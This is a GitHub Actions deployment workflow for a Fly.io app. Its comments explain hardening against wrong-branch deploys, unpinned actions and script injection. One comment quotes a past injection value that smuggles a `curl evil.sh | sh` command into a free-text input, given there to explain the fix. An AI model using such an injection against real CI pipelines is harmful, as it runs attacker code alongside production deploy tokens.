name: deploy

# Manual only. A deploy changes what the demo phone talks to, so it never rides
# along with a merge: someone decides, and the run records who and when. That
# also means a red main cannot deploy itself while nobody is looking.
on:
  workflow_dispatch:
    inputs:
      reason:
        description: "Why this deploy is happening (recorded in the run)"
        required: true
        type: string

# One deploy at a time. Two overlapping runs against one machine is how a
# half-updated image ends up serving the demo.
concurrency:
  group: deploy-frontdoor-measure
  cancel-in-progress: false

# Read the tree and nothing else. Without this block the job runs with the
# repository's DEFAULT token scope, which is whatever the org setting happens to
# be -- on many repositories that is write to contents, packages, issues and pull
# requests, handed to every step including a third-party action.
permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    environment: production
    steps:
      # FIRST, before the checkout, because everything after it runs code from
      # whichever ref was dispatched -- the Dockerfile and fly.toml that flyctl
      # builds from, above all.
      #
      # workflow_dispatch offers a branch picker, so a dispatch from any branch
      # deployed that branch. It was not even visibly wrong afterwards: the
      # post-deploy check compares /version against github.sha, which is that
      # same branch's commit, so the run went green over a host serving code
      # that never passed review.
      - name: Refuse to deploy anything but main
        run: |
          if [ "$GITHUB_REF" != "refs/heads/main" ]; then
            echo "::error::this run is on $GITHUB_REF; deploys are only made from refs/heads/main"
            exit 1
          fi

      - uses: actions/checkout@v4

      - name: Refuse to deploy without the token
        env:
          FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
        run: |
          if [ -z "$FLY_API_TOKEN" ]; then
            echo "FLY_API_TOKEN is not set on this repository."
            echo "Create one with 'fly tokens create deploy -a frontdoor-measure'"
            echo "and add it under Settings > Secrets and variables > Actions."
            exit 1
          fi

      # Pinned to a commit, not to @master. A moving ref means whatever that
      # repository holds at dispatch time is downloaded and put on PATH, and the
      # very next step runs the binary it installed with the production deploy
      # token in the environment. Nobody here would review that change, because
      # there is no change here to review.
      #
      # ed8efb3 is release 1.6 / v1 of superfly/flyctl-actions, which is also what
      # master pointed at when this was pinned. To move it: read the diff since
      # this commit, then update the SHA and this comment together.
      - uses: superfly/flyctl-actions/setup-flyctl@ed8efb33836e8b2096c7fd3ba1c8afe303ebbff1

      # No `${{ }}` inside a `run:` block, here or below.
      #
      # An expression is substituted into the script as TEXT before the shell
      # sees it, so a value containing a quote or a `$(...)` becomes part of the
      # command. `inputs.reason` is a free-text box any actor can fill, and
      # `github.actor` is not ours to constrain either. Passing them through
      # `env:` and reading them as quoted shell variables means the value is
      # data no matter what is in it.
      #
      # The rule is every expression, not only the two that were exploitable.
      # Deciding per-expression which contexts are attacker-controlled is a
      # judgement that has to be re-made correctly on every edit; "none of them,
      # ever" is a rule a reader can check at a glance, and a test can pin.
      - name: Deploy
        env:
          FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
          COMMIT: ${{ github.sha }}
        # --build-arg bakes the commit into the image so /version can report it. Without
        # it the server honestly says "unknown", which is the state #337 was filed for.
        run: >
          flyctl deploy --remote-only --app frontdoor-measure
          --build-arg "FRONTDOOR_COMMIT=$COMMIT"

      # The deploy command returning zero only means Fly accepted the image.
      # These say the thing a phone actually needs is answering, and the step
      # fails loudly rather than leaving a green run over a dead demo.
      #
      # The manifest and the service worker are in the list because the install
      # is what they are for: /app answering 200 with a broken /app-manifest.json
      # is a page that opens in Safari and cannot be added to a home screen, and
      # a broken /app-sw.js is a page that needs signal. Both fail exactly where
      # nobody is looking at CI -- on a phone, at the venue.
      - name: Smoke the endpoints a phone uses
        run: |
          set -e
          base=https://frontdoor-measure.fly.dev
          for path in /health /app /app-icon.png /app-manifest.json /app-sw.js /version; do
            code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 30 --retry 5 --retry-delay 6 --retry-all-errors "$base$path")
            echo "$path -> $code"
            if [ "$code" != "200" ]; then
              echo "::error::$path answered $code; the deploy is not serving the demo path"
              exit 1
            fi
          done

      # The deploy is only honest if the thing now running says it is this commit. Without
      # this a build-arg typo leaves /version saying "unknown" and a green run over a server
      # nobody can identify -- which is exactly the state #337 was filed for.
      - name: The server must report the commit we just deployed
        env:
          COMMIT: ${{ github.sha }}
        run: |
          set -e
          reported=$(curl -sS --max-time 30 --retry 5 --retry-delay 6 --retry-all-errors \
            https://frontdoor-measure.fly.dev/version \
            | python3 -c 'import json,sys; print(json.load(sys.stdin)["commit"])')
          echo "deployed reports: $reported"
          if [ "$reported" != "$COMMIT" ]; then
            echo "::error::/version reports '$reported' but this run deployed $COMMIT"
            exit 1
          fi

      # A deploy that cannot store a photograph looks identical from outside to
      # one that can, right up until a published scan quietly loses its image.
      # That has happened on this project once already, so the run says it.
      - name: Report what the deployment can actually do
        run: |
          set -e
          body=$(curl -sS --max-time 30 --retry 3 --retry-delay 5 --retry-all-errors             https://frontdoor-measure.fly.dev/ready)
          echo "$body"
          degraded=$(printf '%s' "$body" | python3 -c             'import json,sys; print(" ".join(json.load(sys.stdin)["degraded"]))')
          {
            echo "### Readiness"
            echo
            if [ -z "$degraded" ]; then
              echo "All subsystems configured."
            else
              echo "Degraded: $degraded"
            fi
          } >> "$GITHUB_STEP_SUMMARY"
          case " $degraded " in
            *" photo_storage "*)
              echo "::warning::Photo storage is not configured or the bucket did not answer. Scans will be assessed and published, but their photographs will NOT persist." ;;
          esac
          # The other two subsystems are reported for the same reason (#353):
          # each one fails into a page that looks entirely normal.
          case " $degraded " in
            *" scan_store "*)
              echo "::warning::The scan store is unreachable, or holds a record that cannot be read. Published scans are missing from the map, and the volume may not be mounted." ;;
          esac
          case " $degraded " in
            *" map_dataset "*)
              echo "::warning::The map dataset is missing, unparseable, or empty. /map/data is serving no pins." ;;
          esac
          case " $degraded " in
            *" screening "*)
              echo "::error::The model key is not set. No scan can be assessed; the app is not usable."
              exit 1 ;;
          esac

      # `${{ inputs.reason }}` and `${{ github.actor }}` used to be pasted
      # straight into this script. A reason of `"; curl evil.sh | sh; #` ran, in
      # a job holding the production deploy token, on a summary step that runs
      # `if: always()` and so could not be avoided by failing earlier.
      - name: Record what was deployed
        if: always()
        env:
          REASON: ${{ inputs.reason }}
          COMMIT: ${{ github.sha }}
          ACTOR: ${{ github.actor }}
        run: |
          {
            echo "### Deploy"
            echo
            echo "- Reason: $REASON"
            echo "- Commit: \`$COMMIT\`"
            echo "- Actor: @$ACTOR"
          } >> "$GITHUB_STEP_SUMMARY"
